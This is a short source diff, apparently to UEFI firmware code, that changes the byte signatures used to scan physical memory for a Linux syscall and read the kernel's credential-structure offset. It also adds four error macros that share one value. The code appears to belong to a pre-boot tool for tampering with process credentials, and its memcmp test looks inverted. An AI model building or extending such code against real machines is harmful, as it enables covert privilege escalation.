@@ -20,6 +20,10 @@
 #define SYS_GETRESUID 118
 #define SYS_GETRESGID 120
 
+#define SYSCALL_TAB_NOT_FOUND (EFI_NOT_FOUND | 0x100)
+#define CRED_STRUCT_NOT_FOUND (EFI_NOT_FOUND | 0x100)
+#define FSCREDS_NOT_FOUND (EFI_NOT_FOUND | 0x100)
+#define CREDS_TAB_NOT_FOUND (EFI_NOT_FOUND | 0x100)
 
 struct CredOffsets {
     INT32 task_struct_offset;
@@ -140,8 +144,8 @@ static EFI_STATUS parse_fs_offsets_from_syscall(EFI_PHYSICAL_ADDRESS syscall_tab
         return status;
 
     for (EFI_PHYSICAL_ADDRESS addr=__sys_setfs_id_phys; addr < (__sys_setfs_id_phys + 0xff); ++addr) {
-        if (memcmp((void *) (addr + 0x00), "\x48\x8b\xa8", 3) &&
-            memcmp((void *) (addr + 0x07), "\x8b\x75", 2)) {
+        if (memcmp((void *) (addr + 0x00), "\x48\x8b\x98", 3) &&
+            memcmp((void *) (addr + 0x07), "\x8b\x73", 2)) {
 
             if (cred_offset)
                 *cred_offset = *((UINT8 *) (addr + 9));
